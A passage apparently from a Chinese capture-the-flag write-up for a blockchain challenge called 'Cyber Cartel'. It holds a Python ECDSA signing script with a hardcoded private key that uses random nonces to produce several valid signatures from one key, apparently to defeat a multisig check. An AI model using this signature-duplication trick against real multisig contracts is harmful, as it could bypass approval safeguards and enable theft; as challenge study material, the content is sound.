&lt;h2 id=&quot;cyber-cartel&quot;&gt;Cyber Cartel&lt;&#x2F;h2&gt;
&lt;p&gt;看起来改k多签几个就行&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;hashlib
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;hmac
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;eth_utils &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;big_endian_to_int
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;Crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;Util&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;long_to_bytes
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;web3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;    Web3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    Account
&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;eth_keys&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;constants &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;SECPK1_N as &lt;&#x2F;span&gt;&lt;span&gt;N&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;SECPK1_G as &lt;&#x2F;span&gt;&lt;span&gt;G
&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;eth_keys&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;backends&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;native&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;jacobian &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;    inv&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    fast_multiply
&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;deterministic_generate_k&lt;&#x2F;span&gt;&lt;span&gt;(msg_hash&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                             private_key_bytes&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;-&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    v_0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;\x01&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;32
&lt;&#x2F;span&gt;&lt;span&gt;    k_0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;\x00&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;32
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    k_1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;hmac&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;new&lt;&#x2F;span&gt;&lt;span&gt;(k_0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;v_0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;\x00&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;private_key_bytes &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;msg_hash&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;hashlib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sha256)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;digest&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    v_1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;hmac&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;new&lt;&#x2F;span&gt;&lt;span&gt;(k_1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;v_0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;hashlib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sha256)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;digest&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    k_2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;hmac&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;new&lt;&#x2F;span&gt;&lt;span&gt;(k_1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;v_1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;\x01&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;private_key_bytes &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;msg_hash&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;hashlib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sha256)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;digest&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    v_2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;hmac&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;new&lt;&#x2F;span&gt;&lt;span&gt;(k_2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;v_1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;hashlib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sha256)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;digest&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    kb &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;hmac&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;new&lt;&#x2F;span&gt;&lt;span&gt;(k_2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;v_2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;hashlib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sha256)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;digest&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    k &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;big_endian_to_int&lt;&#x2F;span&gt;&lt;span&gt;(kb)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;k
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;ecdsa_sign&lt;&#x2F;span&gt;&lt;span&gt;(msg_hash&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;               private_key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;               deterministic&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool = True&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(msg_hash) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;length of msg_hash must == 32&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if not &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;isinstance&lt;&#x2F;span&gt;&lt;span&gt;(private_key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;        private_key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;HexBytes&lt;&#x2F;span&gt;&lt;span&gt;(private_key)
&lt;&#x2F;span&gt;&lt;span&gt;    z &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;big_endian_to_int&lt;&#x2F;span&gt;&lt;span&gt;(msg_hash)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;deterministic:
&lt;&#x2F;span&gt;&lt;span&gt;        k &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;deterministic_generate_k&lt;&#x2F;span&gt;&lt;span&gt;(msg_hash&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;private_key)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# print(f&amp;quot;k: {k}, G: {G}, N: {N}&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        k &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;__import__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;secrets&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;randbelow&lt;&#x2F;span&gt;&lt;span&gt;(N&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    r, y &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;fast_multiply&lt;&#x2F;span&gt;&lt;span&gt;(G&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;k)
&lt;&#x2F;span&gt;&lt;span&gt;    s_raw &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;inv&lt;&#x2F;span&gt;&lt;span&gt;(k&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;N) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;(z &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;r &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;big_endian_to_int&lt;&#x2F;span&gt;&lt;span&gt;(private_key)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;N
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    v &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;27 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;((y &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;^ &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;s_raw &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span&gt;N &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;    s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;s_raw &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;s_raw &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span&gt;N &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;N &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;s_raw
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;v, r, s
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;ecdsa_recover&lt;&#x2F;span&gt;&lt;span&gt;(msg_hash&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                  vrs):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;Account&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;_recover_hash&lt;&#x2F;span&gt;&lt;span&gt;(msg_hash&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;vrs &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(vrs[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;27&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;vrs[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;vrs[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;]))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;sign_data &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;a&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;private_key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;long_to_bytes&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0xa7c3cc196ea8a05f49d06121e12299fb686b7b477ec0b048e8120fb5ac86d167&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# hashed = Web3.keccak(sign_data)
&lt;&#x2F;span&gt;&lt;span&gt;hashed &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;long_to_bytes&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x67d0abb821094e56ca8ceed11f91bf5a761528cd11969fbaacaf141d4b7858fd&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;(v&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;s) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;ecdsa_sign&lt;&#x2F;span&gt;&lt;span&gt;(hashed&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;private_key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;deterministic&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=False&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;message_hash =&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;hashed&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;r =&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;(r))
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;s =&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;(s))
